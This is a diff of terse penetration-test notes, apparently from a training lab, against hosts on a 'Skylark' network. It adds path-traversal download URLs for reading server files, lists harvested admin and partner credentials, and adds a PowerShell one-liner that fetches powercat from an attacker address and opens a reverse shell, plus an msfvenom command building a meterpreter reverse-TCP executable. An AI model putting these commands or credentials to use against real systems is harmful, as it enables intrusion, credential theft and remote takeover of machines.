@@ -44,6 +44,9 @@ http://192.168.229.220/download?filename=../../../../../../../../../../../inetpu
 
 http://192.168.229.220/download?filename=../../../../../../../../../../../inetpub/wwwroot/appsettings.json
 
+http://192.168.229.220/download?filename=../../../../../../../../../../../C:/Uploads/f63a20c6test2.ps1
+http://192.168.229.220/download?filename=../../../../../../../../../../../Uploads/f63a20c6test2.ps1
+
 # obtain admin creds
 skylark_admin
 Admin!_xDHj88vAnS!__
@@ -60,10 +63,16 @@ partner:Skylark__ChangingTheWorld!
 http://192.168.229.220/upload
 http://192.168.229.220/configuration
 
-C:\Uploads
-C:\Uploads\91a05a3b_shell.ps1
- https://HOUSTON01.SKYLARK.COM/download?filename=shell.ps1&token=91a05a3b
+C:\\Uploads
+C:\\Uploads\\f63a20c6test2.ps1
 
+http://192.168.229.220/download?filename=f63a20c6test2.ps1
+
+echo "Hello" | pandoc -o out2.docx
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/powercat.ps1');powercat -c 192.168.45.229 -p 443 -e cmd
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.229 LPORT=443 -f exe > rev443.exe
 ```
 
 .221 (austin02.SKYLARK.com)
